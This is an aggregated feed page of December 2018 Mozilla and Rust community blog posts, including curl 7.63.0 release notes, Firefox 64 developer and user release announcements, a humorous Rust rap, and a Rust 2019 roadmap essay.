Note that it is possible to log in with a github account.</p></div></div><div class="permalink"><a href="https://mozillagfx.wordpress.com/2018/12/13/webrender-newsletter-33/">by Nical at <time datetime="2018-12-13T10:52:05Z" title="December 13, 2018 10:52 AM GMT">‰∏ãÂçà6:52:05</time></a></div></div><div class="news nick-fitzgerald"><a id="news-31"></a><h3><a href="http://fitzgeraldnick.com/" title="Nick Fitzgerald">Nick Fitzgerald</a> ‚Äî <a href="http://fitzgeraldnick.com/2018/12/13/rust-raps.html">Rust Raps</a></h3><div class="entry"><div class="content"><center><p>üî•üî•üî•</p></center>

<p>Just released: the hot new single ‚ÄúFerris Crab (Rust Raps 2018 Edition)‚Äù by
Rusta Rhymes off their upcoming debut album <em>impl Drop for Mic {}</em>.</p>

<center><p>üî•üî•üî•</p></center>

<h3>Listen</h3>

<p>
  <audio controls="controls">
    <source src="http://fitzgeraldnick.com/media/rust-raps.ogg" type="audio/ogg" />
    <source src="http://fitzgeraldnick.com/media/rust-raps.mp3" type="audio/mp3" />
    <source src="http://fitzgeraldnick.com/media/rust-raps.flac" type="audio/flac" />
  </audio>
</p>

<h3>Download</h3>

<ul>
  <li><a href="http://fitzgeraldnick.com/media/rust-raps.ogg"><code>rust-raps.ogg</code> (2.7M)</a></li>
  <li><a href="http://fitzgeraldnick.com/media/rust-raps.mp3"><code>rust-raps.mp3</code> (5.3M)</a></li>
  <li><a href="http://fitzgeraldnick.com/media/rust-raps.flac"><code>rust-raps.flac</code> (15M)</a></li>
</ul>

<h3>Lyrics</h3>

<p>(Intro)</p>

<p>My friend with the gift of gab? Ferris Crab.</p>

<p>(Verse 1)</p>

<p>One of my crates got a lot of fly traits<br />
Twenty ‚Äúi‚Äù eight edition? My decision: time to migrate<br />
I‚Äôm getting irate at all the excess <code>unsafe</code><br />
wait ‚Äî backtrace</p>

<p>We got a cute crab, which is the best crate?<br />
That‚Äôs up for grabs. GitHub or Phab-<br />
ricator, review my pull now or later<br />
Hit <code>@bors</code> with the r+ and you‚Äôll be my saviour</p>

<p>And when I‚Äôm coming through, I got a <code>cargo</code> too<br />
Reaction to wasm? Domain working group<br />
If you need a <code>regex</code>, BurntSushi is your dude<br />
But if you need a <code>Future</code> well we also got a few</p>

<p>Popping off this <code>Vec</code> like a pimple<br />
And you know that the block I‚Äôm from is an <code>impl</code><br />
So if I talk about an IR, no it‚Äôs not GIMPLE<br />
Only <code>rustc</code> MIR, just that simple</p>

<p>(Chorus)</p>

<p>Thought there‚Äôd never be a Rust Rap?<br />
Turns out this is just that<br />
impl newsletter #RustFacts<br />
Ferris Crab, that‚Äôs a must have<br />
Data race, we gon‚Äô bust that<br />
Mem unsafe, we gon‚Äô bust that<br />
This the first and only Rust Rap<br />
Ferris Crab, that‚Äôs a must have</p>

<p>(Verse 2)</p>

<p>If you never borrow check, then you‚Äôre gonna get wrecked<br />
Pull out <code>gdb</code> cause you need to inspect out-of-bounds index<br />
Oh guess what‚Äôs next?<br />
Use after free turns out it‚Äôs gonna be</p>

<p>Or‚Ä¶ just use the <code>rustc</code><br />
And you‚Äôll be flushing all of these bugs down the drain<br />
Gushing super fast code from your brain<br />
No dusting: quite easy to maintain</p>

<p>What‚Äôs the secret sauce? It‚Äôs all zero cost<br />
Couldn‚Äôt do it better if your boss<br />
Demand you try to do it all by hand, but why?<br />
Hate to be that guy, but generics monomorphize</p>

<p>Don‚Äôt use a <code>while</code> loop, <code>i &lt; n</code><br />
Use an <code>Iterator</code>: much better by ten<br />
And when you have a dozen eggs don‚Äôt start counting hens<br />
But me and Ferris Crab: best friends to the end</p>

<p>(Chorus)</p>

<p>Thought there‚Äôd never be a Rust Rap?<br />
Turns out this is just that<br />
impl newsletter #RustFacts<br />
Ferris Crab, that‚Äôs a must have<br />
Data race, we gon‚Äô bust that<br />
Mem unsafe, we gon‚Äô bust that<br />
This the first and only Rust Rap<br />
Ferris Crab, that‚Äôs a must have</p>

<p>(Outro)</p>

<p>My friend with the gift of gab? Ferris Crab.</p></div></div><div class="permalink"><a href="http://fitzgeraldnick.com/2018/12/13/rust-raps.html">by Nick Fitzgerald at <time datetime="2018-12-13T08:00:00Z" title="December 13, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><h2><time datetime="2018-12-12">Wednesday, 12 December 2018</time></h2><div class="news daniel-stenberg" xml:lang="en-US"><a id="news-32"></a><h3><a href="https://daniel.haxx.se/blog" title="daniel.haxx.se">Daniel Stenberg</a> ‚Äî <a href="https://daniel.haxx.se/blog/2018/12/12/7-63-0-the-endless-path/">7.63.0 ‚Äì another step down the endless path</a></h3><div class="entry"><div class="content"><p>This <a href="https://curl.haxx.se/">curl</a> release was developed and put together over a period of six weeks (two weeks less than usual). This was done to accommodate to my personal traveling plans ‚Äì and to avoid doing a release too close to Christmas in case we would ship any security fixes, but ironically, we have no security advisories this time!</p>
<h3>Numbers</h3>
<p style="text-align: center;"><strong>the 178th release<br />3 changes<br />42 days (total: 7,572)</strong><br /><strong>79 bug fixes (total: 4,837)</strong><br /><strong>122 commits (total: 23,799)<br />0 new public libcurl functions (total: 80)<br />1 new curl_easy_setopt() options (total: 262)</strong><br /><strong>0 new curl command line option (total: 219)</strong><br /><strong>51 contributors, 21 new (total: 1,829)</strong><br /><strong>31 authors, 14 new (total: 646)</strong><br /><strong>¬† 0 security fixes (total: 84)</strong></p>
<h4>Changes</h4>
<p>With the new <a href="https://curl.haxx.se/libcurl/c/CURLOPT_CURLU.html">CURLOPT_CURLU</a> option, an application can now¬† pass in an already parsed URL to libcurl instead of a string.</p>
<p>When using libcurl‚Äôs URL API, introduced in <a href="https://daniel.haxx.se/blog/2018/10/31/curl-7-62-0-moar-stuff/">7.62.0</a>, the result is held in a ‚Äúhandle‚Äù and that handle is what now can be passed straight into libcurl when setting up a transfer.</p>
<p>In the command line tool, the <a href="https://curl.haxx.se/docs/manpage.html#-w">‚Äìwrite-out option</a> got the ability to optionally redirect its output to stderr. Previously it was always a given file or stdout but many people found that a bit limiting.</p>


<h4>Interesting bug-fixes<br /></h4>



<p>Weirdly enough we found and fixed a few cookie related bugs this time. I say ‚Äúweirdly‚Äù because you‚Äôd think this is functionality that‚Äôs been around for a long time and should‚Äôve been battle tested and hardened quite a lot already. As usual, I‚Äôm only covering some bugs here. The full list is in the changelog!<br /></p>



<p><strong>Cookie saving</strong> ‚Äì¬† One cookie bug that we fixed was related to <a href="https://curl.haxx.se/bug/?i=3299">libcurl not saving a cookie jar when no cookies are kept in memory</a> (any more). This turned out to be a changed behavior due to us doing more aggressive expiry of old cookies since a while back, and one user had a use case where they would load cookies from a cookie jar and then expect that the cookies would update and write to the jar again, overwriting the old one ‚Äì although when no cookies were left internally it didn‚Äôt touch the file and the application thus reread the old cookies again on the next invoke. Since this was subtly changed behavior, libcurl will now save an empty jar in this situation to make sure such apps will note the blank jar.</p>



<p><strong>Cookie expiry</strong> ‚Äì For the received cookies that get ‚ÄòMax-Age=0‚Äô set, <a href="https://github.com/curl/curl/issues/3351">curl would treat the zero value the same way as any number</a> and therefore have the cookie continue to exist during the whole second it arrived (time() + 0 basically). The cookie RFC is actually rather clear that receiving a zero for this parameter is a special case and means that it should rather <em>expire it immediately</em> and now curl does.</p>



<p><strong>Timeout handling</strong> ‚Äì when calling curl_easy_perform() to do a transfer, and you ask libcurl to timeout that transfer after say 5.1 seconds, the transfer hasn‚Äôt completed in that time and the connection is in fact totally idle at that time, a recent regression would make <a href="https://github.com/curl/curl/issues/3305">libcurl not figure this out</a> until a full 6 seconds had elapsed.</p>



<p><strong>NSS</strong> ‚Äì we fixed several minor¬† issues in the NSS back-end this time. Perhaps the most important issue was if the installed NSS library has been built with TLS 1.3 disabled while curl was built knowing about TLS 1.3, as then things like the ‚Äò‚Äìtlsv1.2‚Äô option would still cause errors. Now <a href="https://curl.haxx.se/bug/?i=3261">curl will fall back correctly</a>. Fixes were also made to make sure <a href="https://curl.haxx.se/bug/?i=3337">curl again works with NSS versions back to 3.14</a>.</p>



<p><strong>OpenSSL</strong> ‚Äì with TLS 1.3 session resumption was changed for TLS, but now <a href="https://curl.haxx.se/bug/?i=3202">curl will support it with OpenSSL</a>.</p>



<p><strong>snprintf</strong> ‚Äì curl has always had its own implementation of the *printf() family of functions for portability reasons. First, traditionally snprintf() was not universally available but then also different implementations have different support for things like 64 bit integers or size_t fields and they would disagree on return values. Since curl‚Äôs snprintf() implementation doesn‚Äôt use the same return code as POSIX or other common implementations we decided <a href="https://curl.haxx.se/bug/?i=3296">we shouldn‚Äôt use the same name</a> so that we don‚Äôt fool readers of code into believing that they are fully compatible. For that reason, we now also ‚Äúban‚Äù the use of snprintf() in the curl code.<br /></p>



<p><strong>URL parsing</strong> ‚Äì there were several regressions from the URL parsing news introduced in curl 7.62.0. That os the first release that offers the new URL API for applications, and we also then switched the internals to use that new code. Perhaps the funniest error was how a short name plus port number (hello:80) was <a href="https://curl.haxx.se/bug/?i=3220">accidentally treated as a ‚Äúscheme‚Äù by the parser</a> and since the scheme was unknown the URL was rejected. The <a href="https://curl.haxx.se/bug/?i=3218">numerical IPv6 address parser</a> was also badly broken ‚Äì I take the blame for not writing good enough test cases for it which made me not realize this in time. Two related regressions that came from the URL¬† work <a href="https://curl.haxx.se/bug/?i=3353">broke HTTP Digest auth</a> and some <a href="https://curl.haxx.se/bug/?i=3362">LDAP transfers</a>.<br /></p>



<p><strong>DoH over HTTP/1</strong> ‚Äì DNS-over-HTTPS was simply not enabled in the build if HTTP/2 support wasn‚Äôt there, which was an unnecessary restriction and now <a href="https://curl.haxx.se/bug/?i=3325">h2-disabled builds will also be able to resolve host names using DoH</a>.</p>



<p><strong>Trailing dots in host name</strong> ‚Äì an old favorite subject came back to haunt us and starting in this version, <a href="https://curl.haxx.se/bug/?i=3022">curl will keep any trailing dot in the host name when it resolves the name</a>, and strip it off for all the rest of the uses where the name will be passed in: for cookies, for the HTTP Host: header and for the TLS SNI field. This, since most resolver APIs makes a difference between resolving ‚Äúhost‚Äù compared to ‚Äúhost.‚Äù and we wouldn‚Äôt previously acknowledge or support the two versions.</p>



<p><strong>HTTP/2</strong> ‚Äì When we enabled HTTP/2 by default for more transfers in <a href="https://daniel.haxx.se/blog/2018/10/31/curl-7-62-0-moar-stuff/">7.62.0,</a> we of course knew that could force more latent bugs to float up to the surface and get noticed. We <a href="https://curl.haxx.se/bug/?i=3349">made curl understand¬† HTTP_1_1_REQUIRED error</a> when received over HTTP/2 and then retry over HTTP/1.1. and <a href="https://curl.haxx.se/bug/?i=3345">if NTLM is selected as the authentication to use curl now forces HTTP/1</a> use.</p>



<h4>Next release<br /></h4>



<p>We have suggested new features already lined up waiting to get merged so the next version is likely to be called 7.64.0 and it is scheduled to happen on February 6th 2019.</p>


<p></p></div></div><div class="permalink"><a href="https://daniel.haxx.se/blog/2018/12/12/7-63-0-the-endless-path/">by Daniel Stenberg at <time datetime="2018-12-12T08:04:35Z" title="December 12, 2018 08:04 AM GMT">‰∏ãÂçà4:04:35</time></a></div></div><div class="news hacks-mozilla-org" xml:lang="en-US"><a id="news-33"></a><h3><a href="https://hacks.mozilla.org/" title="Mozilla Hacks ‚Äì the Web developer blog">Hacks.Mozilla.Org</a> ‚Äî <a href="https://hacks.mozilla.org/2018/12/firefox-64-released/">Firefox 64 Released</a></h3><div class="entry"><div class="content"><p>Firefox 64 is <a href="https://www.mozilla.org/firefox/new/">available today</a>! Our new browser has a wealth of exciting developer additions both in terms of interface features and web platform features, and we can‚Äôt wait to tell you about them. You can find out all the news in the sections below ‚Äî please check them out, have a play around, and let us know your feedback in the comment section below.</p>
<h3>New Firefox interface features</h3>
<h4>Multiple tab selection</h4>
<p>We‚Äôre excited to introduce <strong>multiple tab selection</strong>, which makes it easier to manage windows with many open tabs. Simply hold Control (Windows, Linux) or Command (macOS) and click on tabs to select them.</p>
<p>Once selected, click and drag to move the tabs as a group ‚Äî either within a given window, or out into a new window.</p>
<p></p>
<h4>Devtools improvements</h4>
<p>Our Developer Tools also gained a notable new feature: when hovering over text, the <a href="https://developer.mozilla.org/en-US/docs/Tools/Accessibility_inspector">Accessibility Inspector</a> now displays <strong>text contrast ratios</strong> in the pop-up infobar.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/Screenshot-2018-12-10-23.43.26.png"><img alt="An element is selected by the Accessibility Inspector, and the highlighters shows a AA contrast ratio" class="alignnone wp-image-33016 size-full" src="screenshot-2018-12-10-23.43.26.png" width="702" height="304" /></a></p>
<p>The infobar also indicates whether or not the text meets <a href="https://www.w3.org/TR/UNDERSTANDING-WCAG20/visual-audio-contrast-contrast.html">WCAG 2.0 Level AA or AAA accessibility guidelines</a> for minimum contrast.</p>
<p>Another great addition is related to <a href="https://developer.mozilla.org/en-US/docs/Tools/Responsive_Design_Mode">Responsive Design Mode</a> ‚Äî device selection is now saved between sessions.</p>
<h3>New CSS features in 64</h3>
<h4>Standardizing proprietary styling features</h4>
<p>As part of our platform work, we‚Äôre trying to standardize some of the non-standard CSS features that have often caused developers cross-browser headaches. Landing in 64 we‚Äôve got the following:</p>
<ul>
<li>CSS Scrollbars: The <a href="https://drafts.csswg.org/css-scrollbars-1/">CSS Scrollbars Level 1 spec</a> standardizes features for setting scrollbar width and color, which were originally only available in Internet Explorer. See <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Scrollbars">CSS Scrollbars on MDN Web Docs</a> and <a href="https://css-tricks.com/almanac/properties/s/scrollbar/">Scrollbars on CSS Tricks</a> for more information.</li>
<li><code>-webkit-appearance</code>: To make the effects of the <code>appearance</code> property more consistent across browsers, Firefox has unshipped all of its own proprietary values from web content, and added support for all the <code>-webkit-</code>prefixed versions that are in common use. See <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/appearance">https://developer.mozilla.org/en-US/docs/Web/CSS/appearance on MDN Web Docs</a> for more information.</li>
<li>Going forward in Firefox, if a selector chain or group includes a <code>-webkit-</code>prefixed pseudo-element, that pseudo-element no longer invalidates the whole group.</li>
</ul>
<h4>New media queries</h4>
<p>Firefox 64 sees the addition of new media queries from the <a href="https://drafts.csswg.org/mediaqueries-4/">Level 4</a> and <a href="https://drafts.csswg.org/mediaqueries-5/">Level 5</a> specifications for <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/any-pointer">detecting pointers/touchscreens</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/any-hover">whether the user can hover</a> over something, and whether the user prefers <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-reduced-motion">reduced-motion</a>.</p>
<h4>Multi-position color stop gradients</h4>
<p>CSS gradients now support multi-position color stops (e.g. see their use on <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/linear-gradient#Gradient_with_multi-position_color_stops">linear gradients</a>). So now <code>yellow 25%, yellow 50%</code> can now be written <code>yellow 25% 50%</code>, for example.</p>
<h3>JavaScript improvements</h3>
<p>There were a lot of internal improvements this time around. In terms of developer facing improvements:</p>
<ul>
<li>The TC39 <a href="https://github.com/tc39/proposal-well-formed-stringify">Well-formed JSON.stringify proposal</a> has been implemented, to prevent <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify">JSON.stringify</a> from returning ill-formed Unicode strings.</li>
<li>Proxied functions can now be be passed to <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/toString">Function.prototype.toString</a> <code>.call()</code>.</li>
</ul>
<h3>New Web API highlights</h3>
<h4>Fullscreen API unprefixed</h4>
<p>Goodbye <code>mozRequestFullScreen</code>! The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fullscreen_API">Fullscreen API</a> is now available in Firefox without a prefix. The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullscreen">requestFullscreen</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/exitFullscreen">exitFullscreen</a> APIs now also return promises that resolve once the browser finishes transitioning between states.</p>
<h4>WebVR 1.1 in macOS</h4>
<p>What‚Äôs more immersive than Fullscreen? Virtual reality, of course. And Firefox 64 now supports <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebVR_API">WebVR 1.1</a> on macOS!<br />
<a href="https://mixedreality.mozilla.org/" rel="noopener" target="_top"><img alt="" class="alignnone wp-image-33020 size-large" src="firefox-webvr-500x281.jpg" width="500" height="281" /></a></p>
<h4>startMessages() for Service Workers</h4>
<p>On a completely unrelated note, pages with Service Workers can now use the <a href="https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer/startMessages">startMessages() API</a> to begin receiving queued worker messages, even before page loading has completed.</p>
<h3>New Add-ons Features</h3>
<p>What follows are the highlights. For more details, see <a href="https://blog.mozilla.org/addons/2018/11/08/extensions-in-firefox-64/">Extensions in Firefox 64</a>.</p>
<h4>Context menu enhancements</h4>
<p>Firefox 64 introduces an entirely new API, <code>browser.menus.overrideContext</code>, which allows complete customization of the context menu shown within add-on content like sidebars, popups, etc. These context menus can also automatically include custom entries from <em>other</em> add-ons, as though the user had right-clicked on a tab or bookmark. <a href="https://piro.sakura.ne.jp/latest/blosxom/mozilla/xul/2018-10-14_override-context-on-fx64.htm">Piro‚Äôs blog post</a> explains how it all works.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/Screenshot-2018-12-11-00.33.33.png"><img alt="A custom context menu used by the Tree Style Tab extension" class="alignnone wp-image-33017 size-full" src="screenshot-2018-12-11-00.33.33.png" width="1062" height="874" /></a></p>
<p>In addition:</p>
<ul>
<li>You can now restrict where context menus can appear in an add-on using the new <code>viewTypes</code> property in <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/menus/create">menus.create()</a> and <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/menus/update">menus.update()</a>.</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/menus/update">menus.update()</a> can now be used to update the icon of an existing menu item.</li>
<li>Extensions can now detect which mouse button was used when a menu item was clicked ‚Äî this can be found using the new <code>button</code> property of <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/menus/OnClickData">menus.OnClickData</a>.</li>
</ul>
<h4>Custom content in the Dev Tools inspector</h4>
<p>Also, add-ons can now display custom content within the Dev Tools Inspector sidebar by calling the new <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1398734">sidebar.setPage()</a> API.</p>
<h4>Managing add-ons updated</h4>
<p>For users, the add-on management interface, <code>about:addons</code>, was redesigned to match Firefox‚Äôs preferences page, and right-clicking an add-on icon in the browser toolbar now offers options to directly remove or manage that add-on.</p>
<h3>Privacy features for your protection</h3>
<h4>Symantec CA Distrust</h4>
<p>Due to a <a href="https://wiki.mozilla.org/CA:Symantec_Issues">history of malpractice</a>, Firefox 64 will not trust TLS certificates issued by Symantec (including under their GeoTrust, RapidSSL, and Thawte brands). Microsoft, Google, and Apple are implementing similar measures for their respective browsers.</p>
<h4>Referrer-Policy for stylesheets</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">Referrer-Policy header</a> now applies to requests <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy#Integration_with_CSS">initiated by CSS</a> (e.g., <code>background-image: url("http://...")</code> ). The default policy, <code>no-referrer-when-downgrade</code>, omits referrer information when a secure origin (<code>https</code>) requests data from an insecure origin (<code>http</code>).</p>
<h4>buildID fixed timestamp</h4>
<p>Lastly, from now on the non-standard <a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator/buildID">navigator.buildID</a> property will always return a fixed timestamp, <code>20181001000000</code>, to mitigate its potential abuse for fingerprinting.</p>
<h3>Further Reading</h3>
<p>For more information, see <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/64">Firefox 64 for Developers</a> on MDN, and the official <a href="https://www.mozilla.org/en-US/firefox/64.0/releasenotes/">Firefox 64 Release Notes</a>. If you‚Äôre a web developer, you may also be interested in the <a href="https://www.fxsitecompat.com/en-CA/versions/64/">Firefox 64 Site Compatibility</a> notes.</p>
<p>The post <a href="https://hacks.mozilla.org/2018/12/firefox-64-released/" rel="nofollow">Firefox 64 Released</a> appeared first on <a href="https://hacks.mozilla.org/" rel="nofollow">Mozilla Hacks - the Web developer blog</a>.</p></div></div><div class="permalink"><a href="https://hacks.mozilla.org/2018/12/firefox-64-released/">by Dan Callahan at <time datetime="2018-12-11T17:55:01Z" title="December 11, 2018 05:55 PM GMT">‰∏äÂçà1:55:01</time></a></div></div><h2><time datetime="2018-12-11">Tuesday, 11 December 2018</time></h2><div class="news the-mozilla-blog" xml:lang="en-US"><a id="news-34"></a><h3><a href="https://blog.mozilla.org/" title="The Mozilla Blog">The Mozilla Blog</a> ‚Äî <a href="https://blog.mozilla.org/blog/2018/12/11/latest-firefox-release-available-today/">Latest Firefox Release Available Today</a></h3><div class="entry"><div class="content"><p>It‚Äôs the season for spending time with family and friends over a nice meal and exchanging gifts. Whether it‚Äôs a monogrammed bag or a nicely curated 2019 calendar of family photos, it‚Äôs the practical gifts that get the most use.</p>
<p>For Firefox, we‚Äôre always looking for ways to simplify and personalize your online experience. For today‚Äôs version of Firefox for desktop, we have a couple new features that do just that. They include:</p>
<h3>Contextual Feature Recommender (CFR)</h3>
<p>Aimed at people who are looking to get more out of their online experience or ways to level up. CFR is a system that proactively recommends Firefox features and add-ons based on how you use the web. For example, if you open multiple tabs and repeatedly use these tabs, we may offer a feature called <a href="https://support.mozilla.org/en-US/kb/pinned-tabs-keep-favorite-websites-open">‚ÄúPinned Tabs</a>‚Äù and explain how it works. Firefox curates the suggested features and notifies you. With today‚Äôs release, we will start to rollout with three recommended extensions which include: <a href="https://addons.mozilla.org/en-US/firefox/addon/facebook-container/">Facebook Container</a>, <a href="https://addons.mozilla.org/en-US/firefox/addon/enhancer-for-youtube/">Enhancer for YouTube</a> and <a href="https://addons.mozilla.org/en-US/firefox/addon/to-google-translate/">To Google Translate</a>. This feature is available for US users in regular browsing mode only. They will not appear in Private Browsing mode. Also, Mozilla does NOT receive a copy of your browser history. The entire process happens locally in your copy of Firefox.</p>
<h3>Multiple Tab Organization</h3>
<p>When you go online, it‚Äôs not uncommon to have several tabs open on a variety of topics whether it‚Äôs dinner recipes or gift ideas for your family, it can add up to a lot of tabs. How does anyone ever organize all those tabs? In today‚Äôs release, you can now shift or ctrl-click multiple tabs from the tab bar, and organize them the way you want. You can mute, move, bookmark or pin them quickly and easily.</p>
<p>Here‚Äôs a link to our <a href="https://www.mozilla.org/firefox/64.0/releasenotes/">release notes</a> for a complete list of what‚Äôs included in today‚Äôs release.</p>
<p>Check out and download the latest version of Firefox Quantum available<a href="http://mozilla.org/firefox/new"> here</a>. For the latest version of <a href="https://itunes.apple.com/us/app/firefox-web-browser/id989804926">Firefox for iOS</a>, visit the App Store.</p>
<p style="text-align: center;">
<a class="button button-green" href="https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&amp;utm_medium=referral&amp;utm_campaign=blog-button" rel="external">Download Firefox</a></p>
<p>The post <a href="https://blog.mozilla.org/blog/2018/12/11/latest-firefox-release-available-today/" rel="nofollow">Latest Firefox Release Available Today</a> appeared first on <a href="https://blog.mozilla.org/" rel="nofollow">The Mozilla Blog</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/blog/2018/12/11/latest-firefox-release-available-today/">by Nick Nguyen at <time datetime="2018-12-11T14:00:39Z" title="December 11, 2018 02:00 PM GMT">‰∏ãÂçà10:00:39</time></a></div></div><div class="news nick-fitzgerald"><a id="news-35"></a><h3><a href="http://fitzgeraldnick.com/" title="Nick Fitzgerald">Nick Fitzgerald</a> ‚Äî <a href="http://fitzgeraldnick.com/2018/12/11/rust-2019-think-bigger.html">Rust 2019: Think Bigger</a></h3><div class="entry"><div class="content"><p>Rust shines when we find ways to have our cake and eat it too: memory safety
without runtime garbage collection, abstraction without overhead, threading
without data races. We must find new ways to continue this tradition for Rust
2019 and beyond.</p>

<p>On a day-to-day basis, I am dedicated to small, incremental progress. If a pull
request is an improvement over the status quo, merge it now! Don‚Äôt wait for the
pull request to be perfectly pristine or the feature to be 100% complete. Each
day we drag reality inch by inch towards the ideal.</p>

<p>However, when planning on the scale of years, our vision must not be weighed
down by discussion of incremental improvements: we must rise and collectively
define the lofty ideals we aim for. It requires avoiding local maxima. Nick
Cameron‚Äôs <a href="https://www.ncameron.org/blog/rust-in-2022/">Rust in 2022</a> post, where he starts with what we might
want in a Rust 2022 edition and then works backwards from there, is a great
example.</p>

<p>With that out of the way, I will make a couple suggestions for the Rust 2019
roadmap. I will leave my thoughts for the Rust and WebAssembly domain working
group‚Äôs 2019 roadmap for a future post.</p>

<h3>Speed Up Compilation</h3>

<blockquote>
  <p>Tired: make <code>rustc</code> faster.</p>

  <p>Wired: integrate distributed compilation and artifact caching into <code>cargo</code> and
crates.io.</p>
</blockquote>

<p>Of course we should continue identifying and implementing performance wins in
<code>rustc</code> itself. We should even invest in larger scale rearchitecting like adding
finer-grained parallelism in with <code>rayon</code> (I won‚Äôt go into too many specifics
here because I‚Äôm largely ignorant of them!)</p>

<p>But we should also be thinking bigger.</p>

<p>The fastest compilation is the one that you didn‚Äôt have to do. If we integrate
something like <a href="https://github.com/mozilla/sccache"><code>sccache</code></a> into <code>cargo</code> and crates.io, then individuals
can download pre-built artifacts for common dependencies from a shared cache and
save big on local CPU time. In comparison, a 5% speedup to trait resolution is
peanuts. This is an opportunity that is not available to most language
ecosystems! Most languages don‚Äôt have a compiler toolchain, build system, and
package manager that are widely used together and well integrated.</p>

<h3>First-Class, Domain-Specific Workflows</h3>

<blockquote>
  <p>Tired: make <code>wasm-pack</code> really good.</p>

  <p>Wired: make <code>wasm-pack</code> unnecessary by building generic task hooks into
<code>cargo</code> itself.</p>
</blockquote>

<p>Different domains have different workflows that extend past <code>cargo build</code>. With
WebAssembly, we must also generate JavaScript bindings, run tools like
<code>wasm-opt</code>, create a <code>package.json</code> to integrate with NPM and JavaScript
tooling, etc‚Ä¶ For embedded development, you need to at minimum flash your
built program into your microcontroller‚Äôs persistent memory.</p>

<p>To perform these tasks today, we typically write whole new tools that wrap
<code>cargo</code> (like <code>wasm-pack</code>), invoke external tools manually (like using <code>openocd</code>
by hand), or write a <code>cargo-mytask</code> package to add the <code>cargo mytask</code>
subcommand. These solutions suffer from either repetition and a lack of
automation, or they wrap <code>cargo</code> but fail to expose all the wonderful features
that <code>cargo</code> supports (for example, you can‚Äôt use the <code>--feature</code> flag yet with
<code>wasm-pack</code>). We should not write these tools that wrap <code>cargo</code>, we should write
generic build tasks, which are invoked automatically by <code>cargo</code> itself.</p>

<p><code>cargo</code> should not just grow a <code>post_build.rs</code> hook, its build tasks and
dependencies between tasks and artifacts should become fully extensible. I
should be able to depend on wasm build tasks in my <code>Cargo.toml</code>, and then after
that <code>cargo build</code> should just Do The Right Thing. I shouldn‚Äôt have to compile
these wasm build tasks for every project I use them with. <code>cargo</code> and crates.io
should handle transparently distributing the wasm task binaries to me.</p>

<h3>Growing Working Groups</h3>

<blockquote>
  <p>Tired: the Rust project should start a working group for <code>$PROJECT_OR_DOMAIN</code>.</p>

  <p>Wired: the Rust project should have a working group template, and system of
mentorship for new (and old!) working group leads.</p>
</blockquote>

<p>The more we collaborate and work together, the better we can tackle problems
that are larger than any one of us. The primary way we‚Äôve been organizing
technical efforts in the Rust project has been working groups. But starting a
new working group is hard, and leading a working group is hard.</p>

<p>We should have a template for new working groups that comes with cookie-cutter
steps to follow to help build an open community, articulate working group
vision, and collectively organize. Of course these steps will need to evolve for
each particular working group‚Äôs needs, but having <em>something</em> to help new
working groups hit the ground running is incredibly valuable. It would have been
so useful for me when we were kicking off the WebAssembly domain working group
last year. A lot of things that are obvious in retrospect were not at the time:
hold weekly meetings, adopt an RFC process, communicate(!!), create room for
contributors to own sub-goals, etc‚Ä¶</p>

<p>Additionally, every working group lead should have a mentor who is in a
leadership position within the Rust project: someone who is a member of the Rust
core team or a lead of another working group or team. Someone to rubber duck
with and seek guidance from in the context of leadership and organization.</p>

<p>Instead of enabling Rust users to ask Rust leadership for a working group for
<code>X</code>, we should empower them to start the working group for <code>X</code> themselves, and
we should continuously follow up to ensure that they succeed. To have our cake
and eat it too, Rust development must be a positive-sum game.</p>

<h3><code>#Rust2019</code></h3>

<p>Whatever we end up with in the 2019 roadmap, I have faith that what we choose
will be worthy. We don‚Äôt suffer from a lack of good options.</p>

<p>I hope we never stop dreaming big and being ambitious.</p></div></div><div class="permalink"><a href="http://fitzgeraldnick.com/2018/12/11/rust-2019-think-bigger.html">by Nick Fitzgerald at <time datetime="2018-12-11T08:00:00Z" title="December 11, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><div class="news this-week-in-rust"><a id="news-36"></a><h3><a href="https://this-week-in-rust.org/" title="This Week in Rust">This Week In Rust</a> ‚Äî <a href="https://this-week-in-rust.org/blog/2018/12/11/this-week-in-rust-264/">This Week in Rust 264</a></h3><div class="entry"><div class="content"><p>Hello and welcome to another issue of <em>This Week in Rust</em>!
<a href="http://rust-lang.org/">Rust</a> is a systems language pursuing the trifecta: safety, concurrency, and speed.
This is a weekly summary of its progress and community.
Want something mentioned? Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> or <a href="https://github.com/cmr/this-week-in-rust">send us a pull request</a>.
Want to get involved? <a href="https://github.com/rust-lang/rust/blob/master/CONTRIBUTING.md">We love contributions</a>.</p>
<p><em>This Week in Rust</em> is openly developed <a href="https://github.com/cmr/this-week-in-rust">on GitHub</a>.
